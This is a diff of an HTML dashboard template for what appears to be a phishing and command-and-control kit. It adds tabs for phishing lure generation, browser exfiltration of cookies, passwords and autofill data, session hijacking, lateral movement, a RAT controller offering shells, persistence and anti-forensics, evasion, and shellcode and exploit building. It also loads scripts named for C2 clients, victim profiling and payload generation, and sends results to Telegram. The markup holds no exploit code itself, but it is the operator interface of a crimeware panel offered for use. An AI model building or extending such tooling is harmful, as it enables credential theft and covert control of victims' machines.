+                                    <h3 class="text-sm font-bold text-slate-300 mb-3"><i class="fas fa-sliders-h text-emerald-400 mr-2"></i>Variables</h3>
+                                    <div id="lure-variables-info" class="mb-3"></div>
+                                    <div id="lure-variable-inputs" class="space-y-2 max-h-[250px] overflow-y-auto">
+                                        <p class="text-xs text-gray-500 text-center py-3">Click "Preview Template" to load variable fields</p>
+                                    </div>
+                                    <div class="flex gap-2 mt-3">
+                                        <button id="btn-generate-lure" class="flex-1 px-4 py-2 bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500 text-white rounded-lg text-sm font-bold transition-all">
+                                            <i class="fas fa-magic mr-2"></i>Generate
+                                        </button>
+                                        <button id="btn-save-lure" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                            <i class="fas fa-save mr-2"></i>Save
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="space-y-4">
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                    <div class="flex items-center justify-between mb-3">
+                                        <h3 class="text-sm font-bold text-slate-300"><i class="fas fa-envelope text-emerald-400 mr-2"></i>Generated Lure</h3>
+                                        <button id="btn-copy-lure" class="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded text-xs font-medium transition-colors">
+                                            <i class="fas fa-copy mr-1"></i>Copy
+                                        </button>
+                                    </div>
+                                    <div class="mb-2">
+                                        <label class="text-xs text-slate-400">Subject:</label>
+                                        <div id="lure-output-subject" class="bg-slate-800 rounded p-2 text-sm text-yellow-400 font-medium min-h-[28px]"></div>
+                                    </div>
+                                    <div>
+                                        <label class="text-xs text-slate-400">Body:</label>
+                                        <pre id="lure-output-body" class="bg-slate-800 rounded-lg p-4 text-xs text-emerald-400 font-mono overflow-auto max-h-[350px] whitespace-pre-wrap"></pre>
+                                    </div>
+                                    <div id="lure-output-stats"></div>
+                                    <div style="display:none;">
+                                        <label class="text-xs text-slate-400 mt-2">SMS:</label>
+                                        <div id="lure-output-sms" class="bg-slate-800 rounded p-2 text-sm text-blue-400"></div>
+                                    </div>
+                                </div>
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                    <h3 class="text-sm font-bold text-slate-300 mb-3"><i class="fas fa-bookmark text-emerald-400 mr-2"></i>Saved Lures</h3>
+                                    <div id="saved-lures-list" class="space-y-2 max-h-[200px] overflow-y-auto"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== EXFILTRATION TAB ===== -->
+                    <div id="tab-exfil" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-database text-amber-400"></i>
+                                <span>Browser Data Exfiltration</span>
+                            </h2>
+                            <button id="btn-refresh-exfil" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                <i class="fas fa-sync mr-2"></i>Refresh
+                            </button>
+                        </div>
+                        <div id="exfil-stats"></div>
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <div class="flex gap-3 mb-4">
+                                <select id="exfil-filter-type" class="bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-amber-500">
+                                    <option value="">All Types</option>
+                                    <option value="cookies">🍪 Cookies</option>
+                                    <option value="localStorage">💾 LocalStorage</option>
+                                    <option value="sessionStorage">📦 SessionStorage</option>
+                                    <option value="history">📜 History</option>
+                                    <option value="autofill">📝 Autofill</option>
+                                    <option value="passwords">🔑 Passwords</option>
+                                </select>
+                                <input type="text" id="exfil-filter-ip" class="bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-amber-500" placeholder="Filter by IP...">
+                            </div>
+                            <div id="exfil-data-list" class="space-y-3 max-h-[500px] overflow-y-auto">
+                                <div class="text-center py-8 text-slate-600">
+                                    <i class="fas fa-database text-4xl mb-3"></i>
+                                    <p>Loading exfiltration data...</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== NETWORK TAB ===== -->
+                    <div id="tab-network" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-network-wired text-teal-400"></i>
+                                <span>Network Discovery</span>
+                            </h2>
+                            <button id="btn-refresh-network" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                <i class="fas fa-sync mr-2"></i>Refresh
+                            </button>
+                        </div>
+                        <div id="network-stats"></div>
+                        <div id="network-discovery-list" class="space-y-3">
+                            <div class="text-center py-8 text-slate-600">
+                                <i class="fas fa-network-wired text-4xl mb-3"></i>
+                                <p>Loading network discoveries...</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== PLAYBOOKS TAB ===== -->
+                    <div id="tab-playbooks" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-book text-rose-400"></i>
+                                <span>Playbook Automation</span>
+                            </h2>
+                            <button id="btn-new-playbook" class="px-4 py-2 bg-gradient-to-r from-rose-600 to-pink-600 hover:from-rose-500 hover:to-pink-500 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-rose-500/20">
+                                <i class="fas fa-plus mr-2"></i>New Playbook
+                            </button>
+                        </div>
+
+                        <!-- Playbook Builder (hidden by default) -->
+                        <div id="playbook-builder" style="display:none;" class="bg-slate-900 rounded-xl border border-rose-800 p-5">
+                            <input type="hidden" id="playbook-builder-id" value="">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Playbook Name</label>
+                                    <input type="text" id="playbook-builder-name" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-rose-500" placeholder="My Attack Playbook">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Description</label>
+                                    <input type="text" id="playbook-builder-desc" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-rose-500" placeholder="Optional description">
+                                </div>
+                            </div>
+                            <div class="mb-4">
+                                <label class="text-xs text-slate-400 block mb-2">Available Actions:</label>
+                                <div id="action-palette" class="flex flex-wrap gap-2"></div>
+                            </div>
+                            <div class="mb-4">
+                                <label class="text-xs text-slate-400 block mb-2">Steps:</label>
+                                <div id="builder-steps" class="space-y-2 max-h-[350px] overflow-y-auto"></div>
+                            </div>
+                            <div class="flex gap-2">
+                                <button id="btn-save-playbook" class="px-4 py-2 bg-green-600 hover:bg-green-500 text-white rounded-lg text-sm font-bold transition-colors">
+                                    <i class="fas fa-save mr-2"></i>Save Playbook
+                                </button>
+                                <button onclick="$('#playbook-builder').hide()" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">Cancel</button>
+                            </div>
+                        </div>
+
+                        <!-- Playbooks List -->
+                        <div id="playbook-list" class="space-y-3">
+                            <div class="text-center py-8 text-slate-600">
+                                <i class="fas fa-book text-4xl mb-3"></i>
+                                <p>Loading playbooks...</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Evasion Framework Tab -->
+                    <div id="tab-evasion" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-ghost text-violet-400"></i>Evasion Framework
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Anti-detection, traffic disguise, and fingerprint spoofing engine</p>
+                            </div>
+                        </div>
+                        <div id="evasion-dashboard"></div>
+                    </div>
+
+                    <!-- Threat Intelligence Tab -->
+                    <div id="tab-threat-intel" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-shield-alt text-cyan-400"></i>Threat Intelligence
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">OSINT aggregation, IP enrichment, email intel, and tech fingerprinting</p>
+                            </div>
+                        </div>
+                        <div id="threat-intel-dashboard"></div>
+                    </div>
+
+                    <!-- Session Hijacker Tab -->
+                    <div id="tab-session-hijack" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-user-secret text-indigo-400"></i>Session Hijacker
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Cookie parsing, JWT analysis, token extraction, and replay attack builder</p>
+                            </div>
+                        </div>
+                        <div id="session-hijack-dashboard"></div>
+                    </div>
+
+                    <!-- Pivot Engine Tab -->
+                    <div id="tab-pivot" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-project-diagram text-sky-400"></i>Pivot Engine
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Attack graphs, lateral movement, credential reuse, and kill chain tracking</p>
+                            </div>
+                        </div>
+                        <div id="pivot-engine-dashboard"></div>
+                    </div>
+
+                    <!-- RAT Controller Tab -->
+                    <div id="tab-rat" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-skull-crossbones text-red-400"></i>RAT Controller
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Advanced remote access toolkit — shells, persistence, lateral movement, anti-forensics, and C2 configuration</p>
+                            </div>
+                        </div>
+                        <div id="rat-dashboard"></div>
+                    </div>
+
+                    <!-- ===== AI THREAT ANALYZER TAB ===== -->
+                    <div id="tab-ai-threat" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-brain text-violet-400"></i>AI Threat Analyzer
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Neural threat detection, behavioral analysis, anomaly detection, predictive modeling & automated incident response</p>
+                            </div>
+                        </div>
+                        <div id="ai-threat-dashboard"></div>
+                    </div>
+
+                    <!-- ===== ZERO-DAY EXPLOIT LAB TAB ===== -->
+                    <div id="tab-zeroday" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-bug text-red-500"></i>Zero-Day Exploit Lab
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Vulnerability scanning, shellcode generation, ROP chain building, smart fuzzing & CVE intelligence</p>
+                            </div>
+                        </div>
+                        <div id="zeroday-dashboard"></div>
+                    </div>
+
+                    <!-- ===== QUANTUM CRYPTO ENGINE TAB ===== -->
+                    <div id="tab-quantum" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-atom text-cyan-400"></i>Quantum Crypto Engine
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Post-quantum encryption, entropy analysis, algorithm benchmarks, quantum threat assessment & key exchange simulation</p>
+                            </div>
+                        </div>
+                        <div id="quantum-dashboard"></div>
+                    </div>
+
+                    <!-- ===== DEEP RECON OSINT TAB ===== -->
+                    <div id="tab-deeprecon" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between mb-4">
+                            <div>
+                                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                                    <i class="fas fa-globe text-emerald-400"></i>Deep Recon OSINT
+                                </h2>
+                                <p class="text-xs text-slate-400 mt-1">Domain recon, social profiling, dark web scanning, email intelligence, infrastructure mapping & data correlation</p>
+                            </div>
+                        </div>
+                        <div id="deeprecon-dashboard"></div>
+                    </div>
+
+                    <!-- ===== ALERTS TAB ===== -->
+                    <div id="tab-alerts" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-bell text-red-400"></i>
+                                <span>Security Alerts</span>
+                            </h2>
+                            <div class="flex space-x-3">
+                                <button id="btn-refresh-alerts" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
+                                    <i class="fas fa-sync-alt"></i> <span>Refresh</span>
+                                </button>
+                                <button id="btn-clear-alerts" class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20 flex items-center space-x-2">
+                                    <i class="fas fa-trash"></i> <span>Clear All</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Alert Stats -->
+                        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                            <div class="bg-slate-900 rounded-xl border border-red-500/20 p-4">
+                                <div class="flex items-center space-x-3">
+                                    <div class="w-10 h-10 rounded-lg bg-red-500/10 flex items-center justify-center">
+                                        <i class="fas fa-exclamation-triangle text-red-400"></i>
+                                    </div>
+                                    <div>
+                                        <div id="alert-stat-critical" class="text-xl font-bold text-red-400">0</div>
+                                        <div class="text-xs text-slate-500">Critical</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="bg-slate-900 rounded-xl border border-orange-500/20 p-4">
+                                <div class="flex items-center space-x-3">
+                                    <div class="w-10 h-10 rounded-lg bg-orange-500/10 flex items-center justify-center">
+                                        <i class="fas fa-exclamation-circle text-orange-400"></i>
+                                    </div>
+                                    <div>
+                                        <div id="alert-stat-warning" class="text-xl font-bold text-orange-400">0</div>
+                                        <div class="text-xs text-slate-500">Warning</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="bg-slate-900 rounded-xl border border-blue-500/20 p-4">
+                                <div class="flex items-center space-x-3">
+                                    <div class="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center">
+                                        <i class="fas fa-info-circle text-blue-400"></i>
+                                    </div>
+                                    <div>
+                                        <div id="alert-stat-info" class="text-xl font-bold text-blue-400">0</div>
+                                        <div class="text-xs text-slate-500">Info</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="bg-slate-900 rounded-xl border border-slate-700 p-4">
+                                <div class="flex items-center space-x-3">
+                                    <div class="w-10 h-10 rounded-lg bg-slate-800 flex items-center justify-center">
+                                        <i class="fas fa-list text-slate-400"></i>
+                                    </div>
+                                    <div>
+                                        <div id="alert-stat-total" class="text-xl font-bold text-white">0</div>
+                                        <div class="text-xs text-slate-500">Total</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Create Alert -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                <i class="fas fa-plus-circle text-emerald-400"></i>
+                                <span>Create Alert</span>
+                            </h3>
+                            <div class="grid grid-cols-1 md:grid-cols-4 gap-3">
+                                <input type="text" id="alert-title" placeholder="Alert title..." class="bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none">
+                                <input type="text" id="alert-message" placeholder="Alert message..." class="md:col-span-2 bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none">
+                                <div class="flex space-x-2">
+                                    <select id="alert-severity" class="flex-1 bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none">
+                                        <option value="info">Info</option>
+                                        <option value="warning">Warning</option>
+                                        <option value="critical">Critical</option>
+                                    </select>
+                                    <button id="btn-add-alert" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-sm font-medium transition-colors">
+                                        <i class="fas fa-plus"></i>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Alert Feed -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                <i class="fas fa-stream text-yellow-400"></i>
+                                <span>Alert Feed</span>
+                            </h3>
+                            <div id="alerts-feed" class="space-y-3 max-h-[500px] overflow-y-auto custom-scrollbar">
+                                <div class="text-center text-slate-600 py-8 text-sm">Loading alerts...</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== SETTINGS TAB ===== -->
+                    <div id="tab-settings" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-cog text-slate-400"></i>
+                                <span>Settings</span>
+                            </h2>
+                            <button id="btn-save-settings" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-sm font-medium transition-colors flex items-center space-x-2">
+                                <i class="fas fa-save"></i> <span>Save All Settings</span>
+                            </button>
+                        </div>
+
+                        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                            <!-- General Settings -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                    <i class="fas fa-sliders-h text-blue-400"></i>
+                                    <span>General</span>
+                                </h3>
+                                <div class="space-y-4">
+                                    <div>
+                                        <label class="text-xs text-slate-400 mb-1 block">Server Port</label>
+                                        <input type="number" id="setting-port" value="2525" class="w-full bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none">
+                                    </div>
+                                    <div>
+                                        <label class="text-xs text-slate-400 mb-1 block">Polling Interval (ms)</label>
+                                        <input type="number" id="setting-poll-interval" value="2000" class="w-full bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none">
+                                    </div>
+                                    <div class="flex items-center justify-between">
+                                        <label class="text-xs text-slate-400">Auto-refresh Dashboard</label>
+                                        <label class="relative inline-flex items-center cursor-pointer">
+                                            <input type="checkbox" id="setting-auto-refresh" checked class="sr-only peer">
+                                            <div class="w-9 h-5 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
+                                        </label>
+                                    </div>
+                                    <div class="flex items-center justify-between">
+                                        <label class="text-xs text-slate-400">Sound Notifications</label>
+                                        <label class="relative inline-flex items-center cursor-pointer">
+                                            <input type="checkbox" id="setting-sound" checked class="sr-only peer">
+                                            <div class="w-9 h-5 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Webhook / Notifications -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                    <i class="fas fa-paper-plane text-purple-400"></i>
+                                    <span>Notifications &amp; Webhooks</span>
+                                </h3>
+                                <div class="space-y-4">
+                                    <div>
+                                        <label class="text-xs text-slate-400 mb-1 block">Generic Webhook URL</label>
+                                        <input type="text" id="setting-webhook" placeholder="https://hooks.example.com/..." class="w-full bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none font-mono">
+                                    </div>
+                                    <div>
+                                        <label class="text-xs text-slate-400 mb-1 block">Telegram Bot Token</label>
+                                        <input type="text" id="setting-telegram-token" placeholder="123456:ABC-DEF..." class="w-full bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none font-mono">
+                                    </div>
+                                    <div>
+                                        <label class="text-xs text-slate-400 mb-1 block">Telegram Chat ID</label>
+                                        <input type="text" id="setting-telegram-chat" placeholder="-100123456789" class="w-full bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none font-mono">
+                                    </div>
+                                    <button id="btn-test-webhook" class="w-full px-4 py-2 bg-purple-500/10 hover:bg-purple-500/20 text-purple-400 rounded-lg text-sm font-medium transition-colors border border-purple-500/20">
+                                        <i class="fas fa-paper-plane mr-1"></i> Test Webhook
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Security Settings -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                    <i class="fas fa-shield-alt text-emerald-400"></i>
+                                    <span>Security</span>
+                                </h3>
+                                <div class="space-y-4">
+                                    <div>
+                                        <label class="text-xs text-slate-400 mb-1 block">Panel Username</label>
+                                        <input type="text" id="setting-username" placeholder="admin" class="w-full bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none">
+                                    </div>
+                                    <div>
+                                        <label class="text-xs text-slate-400 mb-1 block">Panel Password</label>
+                                        <input type="password" id="setting-password" placeholder="••••••••" class="w-full bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none">
+                                    </div>
+                                    <div class="flex items-center justify-between">
+                                        <label class="text-xs text-slate-400">Require Login</label>
+                                        <label class="relative inline-flex items-center cursor-pointer">
+                                            <input type="checkbox" id="setting-require-login" checked class="sr-only peer">
+                                            <div class="w-9 h-5 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Data Management -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                    <i class="fas fa-database text-yellow-400"></i>
+                                    <span>Data Management</span>
+                                </h3>
+                                <div class="space-y-4">
+                                    <div class="flex items-center justify-between">
+                                        <label class="text-xs text-slate-400">Auto-delete old captures (days)</label>
+                                        <input type="number" id="setting-auto-delete" value="30" class="w-20 bg-slate-800 text-white rounded-lg px-3 py-2 text-sm border border-slate-700 focus:border-blue-500 focus:outline-none text-center">
+                                    </div>
+                                    <div class="flex items-center justify-between">
+                                        <label class="text-xs text-slate-400">Log Database Operations</label>
+                                        <label class="relative inline-flex items-center cursor-pointer">
+                                            <input type="checkbox" id="setting-log-db" checked class="sr-only peer">
+                                            <div class="w-9 h-5 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
+                                        </label>
+                                    </div>
+                                    <div class="pt-2 border-t border-slate-800 space-y-2">
+                                        <button id="btn-export-data" class="w-full px-4 py-2 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 rounded-lg text-sm font-medium transition-colors border border-emerald-500/20">
+                                            <i class="fas fa-file-archive mr-1"></i> Export All Data (ZIP)
+                                        </button>
+                                        <button id="btn-nuke-data" class="w-full px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-lg text-sm font-medium transition-colors border border-red-500/20">
+                                            <i class="fas fa-radiation mr-1"></i> Emergency Data Wipe
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Server Info -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                <i class="fas fa-info-circle text-slate-400"></i>
+                                <span>Server Information</span>
+                            </h3>
+                            <div id="settings-server-info" class="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
+                                <div class="bg-slate-800/50 rounded-lg p-3"><div class="text-slate-500 mb-1">Version</div><div class="text-white font-mono" id="info-version">v4.0</div></div>
+                                <div class="bg-slate-800/50 rounded-lg p-3"><div class="text-slate-500 mb-1">Platform</div><div class="text-white font-mono" id="info-platform">-</div></div>
+                                <div class="bg-slate-800/50 rounded-lg p-3"><div class="text-slate-500 mb-1">Python</div><div class="text-white font-mono" id="info-python">-</div></div>
+                                <div class="bg-slate-800/50 rounded-lg p-3"><div class="text-slate-500 mb-1">Database</div><div class="text-white font-mono" id="info-db-size">-</div></div>
+                            </div>
+                        </div>
+                    </div>
+
                 </div>
             </div>
         </div>
     </main>
+
+    <!-- Audio for notifications -->
+    <audio id="notification-sound" preload="auto">
+        <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
+    </audio>
 
     <script src="{{ url_for('static', filename='js/jquery.min.js') }}"></script>
     <script src="{{ url_for('static', filename='js/sweetalert2.min.js') }}"></script>
@@ -720,6 +2084,264 @@
     <script src="{{ url_for('static', filename='js/c2_client.js') }}"></script>
     <script src="{{ url_for('static', filename='js/file_manager.js') }}"></script>
     <script src="{{ url_for('static', filename='js/mobile_control.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/advanced_dashboard.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/credentials_intel.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/payload_generator.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/campaign_manager.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/victim_profiler.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/obfuscation_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/report_generator_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/lure_generator_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/browser_exfil_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/network_discovery_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/playbook_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/evasion_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/threat_intel_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/session_hijacker_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/pivot_engine_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/rat_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/ai_threat_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/zeroday_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/quantum_crypto_ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/deep_recon_ui.js') }}"></script>
+    <script>
+        // Initialize new modules when their tabs are shown
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const tab = this.dataset.tab;
+                if (tab === 'credentials') CredentialIntel.init();
+                if (tab === 'payloads') PayloadGenerator.init();
+                if (tab === 'campaigns') CampaignManager.init();
+                if (tab === 'profiles') { VictimProfiler.init(); VictimProfiler.loadTelegramConfig(); }
+                if (tab === 'obfuscation') ObfuscationUI.init();
+                if (tab === 'reports') ReportGeneratorUI.init();
+                if (tab === 'lures') LureGeneratorUI.init();
+                if (tab === 'exfil') BrowserExfilUI.init();
+                if (tab === 'network') NetworkDiscoveryUI.init();
+                if (tab === 'playbooks') PlaybookUI.init();
+                if (tab === 'evasion') EvasionUI.init();
+                if (tab === 'threat-intel') ThreatIntelUI.init();
+                if (tab === 'session-hijack') SessionHijackerUI.init();
+                if (tab === 'pivot') PivotEngineUI.init();
+                if (tab === 'rat') RatControllerUI.init();
+                if (tab === 'ai-threat') AIThreatUI.init();
+                if (tab === 'zeroday') ZeroDayUI.init();
+                if (tab === 'quantum') QuantumCryptoUI.init();
+                if (tab === 'deeprecon') DeepReconUI.init();
+                if (tab === 'alerts') loadAlerts();
+                if (tab === 'settings') loadSettings();
+                // Sync sidebar active state
+                document.querySelectorAll('.nav-link').forEach(n => {
+                    n.classList.remove('active','bg-blue-600/10','text-blue-400','border-blue-600/10');
+                    n.classList.add('text-slate-400');
+                    const st = n.dataset.sidebarTab;
+                    if (st === tab) {
+                        n.classList.add('active','bg-blue-600/10','text-blue-400','border-blue-600/10');
+                        n.classList.remove('text-slate-400');
+                    }
+                });
+            });
+        });
+
+        // ===== SIDEBAR NAVIGATION =====
+        document.querySelectorAll('.nav-link[data-sidebar-tab]').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const tabName = this.dataset.sidebarTab;
+                // Update sidebar active states
+                document.querySelectorAll('.nav-link').forEach(n => {
+                    n.classList.remove('active','bg-blue-600/10','text-blue-400','border-blue-600/10');
+                    n.classList.add('text-slate-400');
+                });
